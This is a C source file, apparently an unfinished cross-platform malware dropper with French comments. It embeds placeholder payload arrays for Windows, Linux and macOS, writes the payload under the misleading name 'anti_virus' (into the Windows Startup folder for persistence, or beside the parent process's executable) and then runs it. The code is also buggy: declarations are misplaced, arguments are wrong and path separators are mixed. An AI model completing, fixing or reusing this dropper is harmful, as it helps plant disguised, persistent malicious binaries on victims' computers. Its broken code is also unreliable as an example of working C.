#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX_PATH 1024

// === INCLUSION DES BINAIRES EN HEXADECIMAL (À REMPLACER) ===
unsigned char payload_win[] = { /* Contenu du .exe ici */ };
unsigned int payload_win_len = sizeof(payload_win);

unsigned char payload_linux[] = { /* Contenu du binaire Linux ici */ };
unsigned int payload_linux_len = sizeof(payload_linux);

unsigned char payload_mac[] = { /* Contenu du binaire macOS ici */ };
unsigned int payload_mac_len = sizeof(payload_mac);

// === Fonction pour écrire le fichier binaire ===
int write_payload(const char *filename, unsigned char *data, unsigned int length) {
    int fd = open(filename, O_CREAT | O_WRONLY, 0755);
    if (fd < 0) {
        perror("Erreur d'écriture du fichier");
        return -1;
    }
    write(fd, data, length);
    close(fd);
    return 0;
}



#ifdef _WIN32
    const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";

    strcpy(temp_path, window_start_path);
    write_payload(temp_path, payload_win, payload_win_len);
    printf("Execution du payload Windows...\n");
    system(temp_path);

#elif __linux__
    // Fonction pour récupérer le chemin d'un processus à partir de son PID
    void get_parent_path(pid_t pid, char *path) {
        FILE *fp;
        char parent_pid[20];
        char proc_path[MAX_PATH];

        // Obtenir le PID du parent
        snprintf(path, sizeof(path), "/proc/%d/stat", pid);
        fp = fopen(path, "r");
        if (fp == NULL) {
            perror("fopen");
            return;
        }

        // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
        if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
        perror("fscanf");
            fclose(fp);
            return;
        }
        fclose(fp);

        // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
        snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
        ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
        if (len == -1) {
            perror("readlink");
            return;
        }

        path[len] = '\0';  // Ajouter le caractère de fin de chaîne
        printf("Le chemin du parent est: %s\n", path);
    }

    int main() {
        char temp_path[256];
        pid_t pid = getpid();
        char path[MAX_PATH];

        get_parent_path(pid, path);    
        strcat(path, "\\anti_virus");

        strcpy(temp_path, path);

        write_payload(temp_path, payload_linux, payload_linux_len);

        printf("Execution du payload Linux...\n");
        system(temp_path);

        return 0;
    }

#elif __APPLE__
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/sysctl.h>
    #include <libproc.h>
    #include <string.h>

    #define MAX_PATH 1024

    void get_parent_path(pid_t pid) {
        char path[MAX_PATH];
        pid_t parent_pid = getppid();

        // Utilisation de proc_pidpath pour obtenir le chemin du processus parent
        int len = proc_pidpath(parent_pid, path, sizeof(path));
        if (len <= 0) {
            perror("proc_pidpath");
            return;
        }

        printf("Le chemin de l'exécutable du parent (PID %d) est : %s\n", parent_pid, path);
    }

    int main() {
        char temp_path[256];
        pid_t pid = getpid();
        char path[MAX_PATH];

        get_parent_path(pid, path);    
        strcat(path, "\\anti_virus");

        strcpy(temp_path, path);
        write_payload(temp_path, payload_mac, payload_mac_len);
        printf("Execution du payload macOS...\n");
        system(temp_path);

        return 0;
    }
    
#endif
